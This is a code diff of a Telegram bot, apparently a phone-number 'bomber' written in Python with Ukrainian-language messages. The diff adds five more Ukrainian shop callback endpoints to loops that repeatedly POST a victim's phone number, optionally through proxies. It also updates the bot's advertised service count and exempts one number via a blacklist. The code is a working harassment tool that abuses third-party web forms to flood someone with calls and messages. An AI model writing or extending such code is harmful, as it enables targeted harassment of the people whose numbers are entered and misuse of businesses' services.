@@ -205,6 +205,11 @@ def send_for_number_https(aa):
         d = requests.post('https://piromarket.com.ua/index.php?dispatch=place_order.call_you_back&comment=',headers=headers,proxies=proxies,data={'name': name,'tel':  aa})
         d = requests.post('https://ilounge.ua/ajax/send-message-to-telegram.php',headers=headers,proxies=proxies,data={'callmeback-name': name,'callmeback-phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
         d = requests.post('https://elektro.in.ua/callme.php',headers=headers,proxies=proxies,data={'phone': f'+{aa[:2]}({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        d = requests.post('https://mamazin.com.ua/ua/api/s/',headers=headers,proxies=proxies, data={'ajaxCall': '1','user': 'guest','form[action]': 'callme','form[name]': name,'form[phone]': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}{aa[8:10]}{aa[10:12]}','form[theme]': '2'})
+        d = requests.post('https://vchehle.ua/uk/callback',headers=headers,proxies=proxies, data={'page': 'https://vchehle.ua/uk/kolonki','name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}' ,'message': ''})
+        d = requests.post('https://pit-jey.com/index.php?route=extension/module/cyber_callback',headers=headers,proxies=proxies, data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','comment_buyer': '','url_site': 'https://pit-jey.com/ua/simpleregister/','action': 'send'})
+        d = requests.post('https://med-magazin.ua/ajax/call/set/',headers=headers,proxies=proxies, data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        d = requests.post('https://air-conditioner.ua/page/page/mail-callback',headers=headers,proxies=proxies, data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
         coun+=1
         print(f'Круг {coun}')
     except:
@@ -323,6 +328,11 @@ def send_for_number(aa):
         d = requests.post('https://piromarket.com.ua/index.php?dispatch=place_order.call_you_back&comment=',headers=headers,data={'name': name,'tel':  aa})
         d = requests.post('https://ilounge.ua/ajax/send-message-to-telegram.php',headers=headers,data={'callmeback-name': name,'callmeback-phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
         d = requests.post('https://elektro.in.ua/callme.php',headers=headers,data={'phone': f'+{aa[:2]}({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        d = requests.post('https://mamazin.com.ua/ua/api/s/',headers=headers,data={'ajaxCall': '1','user': 'guest','form[action]': 'callme','form[name]': name,'form[phone]': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}{aa[8:10]}{aa[10:12]}','form[theme]': '2'})
+        d = requests.post('https://vchehle.ua/uk/callback',headers=headers,data={'page': 'https://vchehle.ua/uk/kolonki','name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}' ,'message': ''})
+        d = requests.post('https://pit-jey.com/index.php?route=extension/module/cyber_callback',headers=headers,data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','comment_buyer': '','url_site': 'https://pit-jey.com/ua/simpleregister/','action': 'send'})
+        d = requests.post('https://med-magazin.ua/ajax/call/set/',headers=headers,data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        d = requests.post('https://air-conditioner.ua/page/page/mail-callback',headers=headers,data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
         coun+=1
         print(f'Круг {coun}')
     except:
@@ -446,7 +456,7 @@ def handle_message_received(message):
 
         elif text == '📈Статистика':
             save_chat_id(chat_id)
-            bot.send_message(chat_id, f'📊Статистика відображається в реальному часі!\nКористувачів🙎‍♂: {users_amount[0]}<b>\nВ боті 69 сервісів</b>', parse_mode='HTML')
+            bot.send_message(chat_id, f'📊Статистика відображається в реальному часі!\nКористувачів🙎‍♂: {users_amount[0]}<b>\nВ боті 73 сервісів</b>', parse_mode='HTML')
 
         elif text == '🔥Розсилка' and chat_id==ADMIN_CHAT_ID:
             save_chat_id(chat_id)
@@ -473,7 +483,10 @@ def handle_message_received(message):
                 sec = message.text.split()[1]
                 prox = message.text.split()[2]
                 num = message.text.split()[0]
-                spam_handler(num, chat_id,sec,prox,name)
+                if num == '380989509257':
+                    bot.send_message(chat_id,'Цей номер в чорному списку.')
+                else:
+                    spam_handler(num, chat_id,sec,prox,name)
             else:
                 bot.send_message(chat_id,'❌Номер не правильно введений!\nВін має починатися з 380')
                 
